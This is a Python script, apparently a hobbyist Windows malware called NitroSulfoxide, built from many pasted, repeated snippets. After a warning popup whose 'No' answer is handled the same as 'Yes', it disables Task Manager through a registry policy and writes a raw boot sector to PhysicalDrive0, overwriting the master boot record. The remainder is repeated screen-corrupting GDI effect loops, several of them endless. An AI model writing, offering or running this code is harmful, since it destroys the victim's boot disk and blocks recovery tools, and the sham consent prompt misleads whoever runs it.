from win32gui import *
from win32api import *
from win32ui import *
from win32con import *


desk = GetDC(0)
x = 70
y = 70
x_2 = 70
y_2 = 70


for i in range(200):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import winreg
import tkinter as tk
from tkinter import messagebox

def popup_warning():
    answer = messagebox.askyesno("Warning", "Are you sure you want to execute NitroSulfoxide THIS IS MALWARE IM NOT RESPONSIBLE FOR ANY DAMEGE CAUSED BY THIS MALWARE. PRESS YES TO DESTROY YOUR PC?")
    if answer:
        print("NitroSulfoxide execution confirmed.")
    else:
        print("NitroSulfoxide execution confirmed.")

root = tk.Tk()
root.withdraw()  # Hide the main window

popup_warning()

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System")
winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

from win32file import *

data = bytes([0xBB, 0x00, 0xA0, 0x8E, 0xC3, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xFF, 0x8E, 0xDF,
0xD9, 0x06, 0x7B, 0x7C, 0xBD, 0xC8, 0x00, 0xD9, 0x06, 0x7B, 0x7C, 0xBA, 0x40, 0x01, 0xD9, 0xEE,
0xD9, 0xEE, 0xB0, 0x64, 0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xE9, 0xD8, 0xC3,
0xD9, 0xC1, 0xD9, 0xC3, 0xDE, 0xC9, 0xDC, 0xC0, 0xD8, 0xC5, 0xDD, 0xDB, 0xDD, 0xD9, 0xD9, 0xC0,
0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xC1, 0xDF, 0x1E, 0x87, 0x7C, 0x83, 0x3E, 0x87, 0x7C,
0x04, 0x7D, 0x04, 0xFE, 0xC8, 0x75, 0xCD, 0xDD, 0xD8, 0xDD, 0xD8, 0x01, 0xF0, 0xAA, 0xD8, 0x06,
0x73, 0x7C, 0x4A, 0x75, 0xB9, 0xDD, 0xD8, 0xD8, 0x06, 0x77, 0x7C, 0x4D, 0x75, 0xA9, 0x46, 0xDD,
0xD8, 0xEB, 0x99, 0x9A, 0x99, 0x19, 0x3C, 0x8F, 0xC2, 0x75, 0x3C, 0x00, 0x00, 0xC0, 0xBF, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

])

for i in range(2):
    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                            OPEN_EXISTING,
                         0, 0)
    WriteFile(hDevice, data , None)
    CloseHandle(hDevice)
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        125, # Red value
        200, # Green value
        110 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(60) # Waits 20 milliseconds
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        25, # Red value
        20, # Green value
        110 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(60) # Waits 20 milliseconds
    # Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
       85, # Red value
        200, # Green value
        110 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(60) # Waits 20 milliseconds
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        89, # Red value
        70, # Green value
        10 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(60) # Waits 20 milliseconds
   # Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        39, # Red value
        70, # Green value
        10 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(60) # Waits 20 milliseconds
   # Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        89, # Red value
        70, # Green value
        210 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(60) # Waits 20 milliseconds
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT) # Makes a lot of stuff :)
    Sleep(10) # Waits 10 milliseconds
ReleaseDC(desk, GetDesktopWindow()) # Releases memory.
DeleteDC(desk) # Deletes our DC.
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *


desk = GetDC(0)
x = 200
y = 200
x_2 = 200
y_2 = 200


for i in range(1000):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10

import win32gui
import win32con
import ctypes
import math

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)
dx = dy = 1
angle = 0
size = 1
speed = 5
while True:
    
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
    dx = math.ceil(math.sin(angle) * size * 10)
    dy = math.ceil(math.cos(angle) * size * 10)
    angle += speed / 10
    if angle > math.pi :
        angle = math.pi * -1


import win32gui
import ctypes

hdc = win32gui.GetDC(0)
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
while True:
    win32gui.InvertRect(hdc, (0, 0, w, h))

import win32gui
import win32con
import ctypes
import math

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)

while True:
    
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, -3,-3, win32con.NOTSRCCOPY)
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT) # Makes a lot of stuff :)
    Sleep(10) # Waits 10 milliseconds
ReleaseDC(desk, GetDesktopWindow()) # Releases memory.
DeleteDC(desk) # Deletes our DC.
import win32gui
import win32api
import win32con
import random
import time

def create_ellipse(x, y, w, h):
    hdc = win32gui.GetDC(0)
    hrgn = win32gui.CreateEllipticRgn(x, y, w + x, h + y)
    win32gui.SelectClipRgn(hdc, hrgn)
    win32gui.BitBlt(hdc, x, y, w, h, hdc, x, y, win32con.NOTSRCCOPY)
    win32gui.DeleteObject(hrgn)
    win32gui.ReleaseDC(None, hdc)

def main():
    for a in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 99), random.randint(0, 199), random.randint(0, 99))))
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-20, -10), sw, sh, hdc, 0, 0, win32con.SRCAND)
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    for b in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 99), random.randint(0, 199), random.randint(0, 99))))
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-20, -10), sw, sh, hdc, 0, 0, win32con.SRCAND)
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    for c in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 99), random.randint(0, 1), random.randint(0, 1))))
        win32gui.BitBlt(hdc, 10 - 10, 10 - 10, sw, sh, hdc, 2, 2, win32con.SRCAND)
        win32gui.BitBlt(hdc, 10 - 10, 12 - 12, sw, sh, hdc, 10, 10, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    for d in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))))
        win32gui.BitBlt(hdc, random.randint(-30, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, 0x9273ecef)
        win32gui.BitBlt(hdc, random.randint(-40, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    rect = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
    w = rect[2] - rect[0] - 500
    h = rect[3] - rect[1] - 500

    for t in range(100):
        size = 300
        x = random.randint(0, w + size) - size // 2
        y = random.randint(0, h + size) - size // 2

        for i in range(0, size, 100):
            create_ellipse(x - i // 2, y - i // 2, i, i)
            time.sleep(0.025)

    for q in range(100):
        hdc = win32gui.GetDC(win32gui.GetDesktopWindow())
        rekt = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
        w = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        h = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        _h = random.randint(0, w) - (w // 2 - 110)

        brush = win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 254), random.randint(0, 254), random.randint(0, 254)))
        win32gui.SelectObject(hdc, brush)
        xyrng = random.randint(0, w)

        pt3 = [(rekt[0] + 60, rekt[1] - 60), (rekt[2] + 60, rekt[1] + 60), (rekt[0] - 60, rekt[3] - 60)]
        win32gui.PlgBlt(hdc, pt3, hdc, rekt[0], rekt[1], rekt[2] - rekt[0], rekt[3] - rekt[1], 0, 0, 0)
        win32gui.PlgBlt(hdc, pt3, hdc, rekt[0], rekt[1], rekt[2] - rekt[0], rekt[3] - rekt[1], 0, 0, 0)

        win32gui.BitBlt(hdc, xyrng, _h, xyrng, _h, hdc, random.randint(-50, 50), xyrng, win32con.SRCCOPY)
        win32gui.PatBlt(hdc, xyrng, h, xyrng, _h, win32con.PATINVERT)

        win32gui.StretchBlt(hdc, -16, -16, w + 32, _h + 32, hdc, 0, 0, w, _h, win32con.SRCCOPY)
        win32gui.StretchBlt(hdc, 16, 16, w - 32, _h - 32, hdc, 0, 0, w, _h, win32con.SRCCOPY)

if __name__ == "__main__":
    main()
    import win32gui
import win32api
import win32con
import random
import time

def create_ellipse(x, y, w, h):
    hdc = win32gui.GetDC(0)
    hrgn = win32gui.CreateEllipticRgn(x, y, w + x, h + y)
    win32gui.SelectClipRgn(hdc, hrgn)
    win32gui.BitBlt(hdc, x, y, w, h, hdc, x, y, win32con.NOTSRCCOPY)
    win32gui.DeleteObject(hrgn)
    win32gui.ReleaseDC(None, hdc)

def main():
    for a in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 99), random.randint(0, 199), random.randint(0, 99))))
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-20, -10), sw, sh, hdc, 0, 0, win32con.SRCAND)
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    for b in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 99), random.randint(0, 199), random.randint(0, 99))))
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-20, -10), sw, sh, hdc, 0, 0, win32con.SRCAND)
        win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    for c in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 99), random.randint(0, 1), random.randint(0, 1))))
        win32gui.BitBlt(hdc, 10 - 10, 10 - 10, sw, sh, hdc, 2, 2, win32con.SRCAND)
        win32gui.BitBlt(hdc, 10 - 10, 12 - 12, sw, sh, hdc, 10, 10, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    for d in range(100):
        hdc = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        sh = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        win32gui.SelectObject(hdc, win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))))
        win32gui.BitBlt(hdc, random.randint(-30, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, 0x9273ecef)
        win32gui.BitBlt(hdc, random.randint(-40, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)
        win32gui.ReleaseDC(None, hdc)
        time.sleep(0.1)

    rect = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
    w = rect[2] - rect[0] - 500
    h = rect[3] - rect[1] - 500

    for t in range(100):
        size = 300
        x = random.randint(0, w + size) - size // 2
        y = random.randint(0, h + size) - size // 2

        for i in range(0, size, 100):
            create_ellipse(x - i // 2, y - i // 2, i, i)
            time.sleep(0.025)

    for q in range(100):
        hdc = win32gui.GetDC(win32gui.GetDesktopWindow())
        rekt = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
        w = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        h = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        _h = random.randint(0, w) - (w // 2 - 110)

        brush = win32gui.CreateSolidBrush(win32api.RGB(random.randint(0, 254), random.randint(0, 254), random.randint(0, 254)))
        win32gui.SelectObject(hdc, brush)
        xyrng = random.randint(0, w)

        pt3 = [(rekt[0] + 60, rekt[1] - 60), (rekt[2] + 60, rekt[1] + 60), (rekt[0] - 60, rekt[3] - 60)]
        win32gui.PlgBlt(hdc, pt3, hdc, rekt[0], rekt[1], rekt[2] - rekt[0], rekt[3] - rekt[1], 0, 0, 0)
        win32gui.PlgBlt(hdc, pt3, hdc, rekt[0], rekt[1], rekt[2] - rekt[0], rekt[3] - rekt[1], 0, 0, 0)

        win32gui.BitBlt(hdc, xyrng, _h, xyrng, _h, hdc, random.randint(-50, 50), xyrng, win32con.SRCCOPY)
        win32gui.PatBlt(hdc, xyrng, h, xyrng, _h, win32con.PATINVERT)

        win32gui.StretchBlt(hdc, -16, -16, w + 32, _h + 32, hdc, 0, 0, w, _h, win32con.SRCCOPY)
        win32gui.StretchBlt(hdc, 16, 16, w - 32, _h - 32, hdc, 0, 0, w, _h, win32con.SRCCOPY)

if __name__ == "__main__":
    main()
import ctypes
import random
import time

def get_system_metrics(nIndex):
    return ctypes.windll.user32.GetSystemMetrics(nIndex)

def get_dc(hWnd):
    return ctypes.windll.user32.GetDC(hWnd)

def create_solid_brush(color):
    return ctypes.windll.gdi32.CreateSolidBrush(color)

def select_object(hdc, hgdiobj):
    return ctypes.windll.gdi32.SelectObject(hdc, hgdiobj)

def release_dc(hWnd, hDC):
    return ctypes.windll.user32.ReleaseDC(hWnd, hDC)

def delete_object(hObject):
    return ctypes.windll.gdi32.DeleteObject(hObject)

def ellipse(hdc, left, top, right, bottom):
    return ctypes.windll.gdi32.Ellipse(hdc, left, top, right, bottom)

def main():
    w = get_system_metrics(0)
    h = get_system_metrics(1)
    signX = 1
    signY = 1
    signX1 = 1
    signY1 = 1
    incrementor = 10
    x = 10
    y = 10

    while True:
        hdc = get_dc(0)
        x += incrementor * signX
        y += incrementor * signY
        top_x = 0 + x
        top_y = 0 + y
        bottom_x = 100 + x
        bottom_y = 100 + y
        brush = create_solid_brush((random.randint(0, 255) << 16) | (random.randint(0, 255) << 8) | random.randint(0, 255))
        select_object(hdc, brush)
        ellipse(hdc, top_x, top_y, bottom_x, bottom_y)

        if y >= get_system_metrics(1):
            signY = -1

        if x >= get_system_metrics(0):
            signX = -1

        if y == 0:
            signY = 1

        if x == 0:
            signX = 1

        time.sleep(0.01)
        delete_object(brush)
        release_dc(0, hdc)

if __name__ == "__main__":
    main()

